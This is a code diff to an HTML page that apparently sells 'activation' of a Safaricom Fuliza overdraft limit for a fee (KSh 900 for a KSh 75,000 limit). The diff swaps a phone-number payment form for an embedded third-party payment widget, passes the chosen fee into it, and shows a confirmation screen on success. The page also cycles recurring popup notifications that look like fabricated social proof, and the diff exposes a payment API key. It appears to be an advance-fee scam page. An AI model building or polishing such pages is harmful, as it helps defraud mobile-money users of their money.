@@ -49,6 +49,7 @@
         .top-notif .avatar { width: 35px; height: 35px; font-size: 18px; background: #00a651; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; }        
         .error { color: #d32f2f; font-size: 12px; margin-top: 5px; display: none; }
     </style>        
+    <script src="https://stkpush.co.ke/static/js/finapi-widget.min.js"></script>
 </head>        
 <body>  
 
@@ -128,12 +129,15 @@
             <h2>Activate Your Fuliza Limit Now</h2>        
             <div class="summary-box"><span>Selected Limit:</span> <span>KSh <span id="sLimit">75,000</span></span></div>        
             <div class="summary-box"><span>Activation Fee:</span> <span>KSh <span id="sFee">900</span></span></div>        
-            <div class="form-group">        
-                <label>Safaricom Phone Number</label>        
-                <input type="tel" id="payPhone" placeholder="07XXXXXXXX au 2547XXXXXXX">
-                <div class="error" id="payPhoneError"></div>
-            </div>        
-            <button id="payBtn" class="btn" onclick="paySTK()">Pay Activation Fee Now</button>        
+            
+            <!-- FinAPI Payment Widget -->
+            <div id="finapi-container" class="finapi-widget" 
+                 data-api-key="sk_test_a1f9663668ca4e5fbb5644142039967b" 
+                 data-amount="100" 
+                 data-color="#00a651"
+                 data-provider="payhero">
+            </div>
+        
         </div>        
     </div>        
 </div>  
@@ -223,6 +227,11 @@ function selectLimit(limit, fee){
     selectedLimit = limit; selectedFee = fee;
     document.getElementById('sLimit').innerText = limit.toLocaleString();
     document.getElementById('sFee').innerText = fee.toLocaleString();
+    
+    const widgetEl = document.getElementById('finapi-container');
+    if(widgetEl) {
+        widgetEl.setAttribute('data-amount', fee);
+    }
     setTimeout(()=>show(4), 300);
 }
 
@@ -283,6 +292,19 @@ function showTopNotif(){
 }
 setTimeout(showTopNotif, 1000);
 setInterval(showTopNotif, 4000);
+
+const widget = document.getElementById('finapi-container');
+if (widget) {
+    widget.addEventListener('finapi:payment_success', (e) => {
+        console.log('Success!', e.detail);
+        document.getElementById('paidPhone').innerText = userData.phone || "your number";
+        show(5);
+    });
+    widget.addEventListener('finapi:payment_failed', (e) => {
+        console.log('Failed!', e.detail);
+        alert('Payment Failed: ' + (e.detail?.message || 'Please try again.'));
+    });
+}
 </script>  
 </body>
 </html>
